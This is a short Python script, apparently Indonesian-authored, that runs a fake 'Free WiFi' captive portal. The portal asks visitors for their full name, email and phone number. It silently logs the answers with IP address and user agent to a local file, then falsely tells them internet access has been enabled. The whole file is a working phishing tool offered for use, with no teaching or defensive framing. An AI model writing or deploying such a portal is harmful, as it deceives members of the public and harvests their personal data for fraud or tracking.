#!/usr/bin/env python3
# fake_wifi.py

import http.server
import socketserver
import urllib.parse
import os
import json
from datetime import datetime

PORT = 8080
LOG_FILE = "logs/logs.txt"
TEMPLATE_FILE = "templates/index.html"

class FakeWiFiHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # Baca template HTML
            try:
                with open(TEMPLATE_FILE, 'r', encoding='utf-8') as f:
                    html = f.read()
            except:
                html = self.get_fallback_html()
            
            self.wfile.write(html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def do_POST(self):
        if self.path == "/":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode('utf-8'))
            
            # Bersihkan data
            data = {k: v[0] if v else '' for k, v in params.items()}
            
            # Tambahkan timestamp
            data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            data['ip'] = self.client_address[0]
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            
            # Simpan ke logs
            os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(json.dumps(data, ensure_ascii=False) + '\n')
            
            # Respons ke user
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            response = '''
            <html>
            <head><meta charset="UTF-8"></head>
            <body style="text-align:center; font-family:Arial; padding:50px;">
                <h2>✅ Terima kasih!</h2>
                <p>Akses internet telah diaktifkan untuk perangkat Anda.</p>
                <p style="font-size:12px; color:gray;">Silakan tutup halaman ini.</p>
            </body>
            </html>
            '''
            self.wfile.write(response.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def get_fallback_html(self):
        return '''
        <html>
        <head><meta charset="UTF-8"></head>
        <body style="font-family:Arial; padding:30px; text-align:center;">
            <h2>Selamat datang di Free WiFi</h2>
            <p>Silakan isi data untuk mengakses internet:</p>
            <form method="POST" action="/">
                <input type="text" name="name" placeholder="Nama Lengkap" required><br><br>
                <input type="email" name="email" placeholder="Email" required><br><br>
                <input type="text" name="phone" placeholder="Nomor HP" required><br><br>
                <button type="submit" style="padding:10px 30px;">Kirim</button>
            </form>
        </body>
        </html>
        '''
    
    def log_message(self, format, *args):
        # Matikan logging default biar ga spam
        pass

if __name__ == "__main__":
    print(f"[+] Web server berjalan di port {PORT}")
    print(f"[+] Log disimpan di {LOG_FILE}")
    with socketserver.TCPServer(("", PORT), FakeWiFiHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Web server dihentikan.")